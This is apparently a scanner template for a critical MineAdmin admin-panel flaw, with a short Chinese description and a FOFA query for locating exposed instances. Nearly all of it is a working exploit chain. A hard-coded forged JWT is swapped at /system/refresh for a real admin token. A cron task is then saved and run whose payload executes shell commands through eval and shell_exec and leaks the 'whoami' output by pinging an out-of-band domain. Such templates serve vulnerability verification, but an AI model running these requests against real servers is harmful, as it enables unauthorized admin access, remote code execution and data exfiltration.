## id: VEID-2026-11103
## name: MineAdmin企业级后台管理系统命令执行漏洞
## author: hack007x
## severity: critical
## tags: veid,rce,veid2026
## description: 1、system/refresh处存在逻辑缺陷漏洞，”refresh”方法用于刷新 Token，攻击者可以未授权构造一个签名为超级管理员的 JWT，直接骗过系统，获取一个合法的、拥有管理员权限的新 Token。2、setting/crontab/save定时任务处存在命令执行漏洞
## affects: MineAdmin v1.x MineAdmin v2.x
## fofa-query: body="MineAdmin"
## verification: true



POST /system/refresh HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
Content-Type: application/json;charset=UTF-8


#@ condition: and
#> extract: name=token, from=body, regex=/"token"\s*:\s*"([^"\\]*(?:\\.[^"\\]*)*)"/, group=1
#@ matcher: status_code == 200

---

POST /setting/crontab/save HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Authorization: Bearer {{token}}
Content-Type: application/json;charset=UTF-8

{"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval('$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".{{oob_domain}}\");');"}

#@ condition: and
#> extract: name=id, from=body, regex=/"id"\s*:\s*(\d+)/, group=1
#@ matcher: status_code == 200


---

POST /setting/crontab/run HTTP/1.1
Host: {{Hostname}}
User-Agent: {{random_ua}}
Authorization: Bearer {{token}}
Content-Type: application/json;charset=UTF-8

{"id":{{id}}}


#@ condition: and
#@ matcher: body contains '"success"' && body contains '"code":'



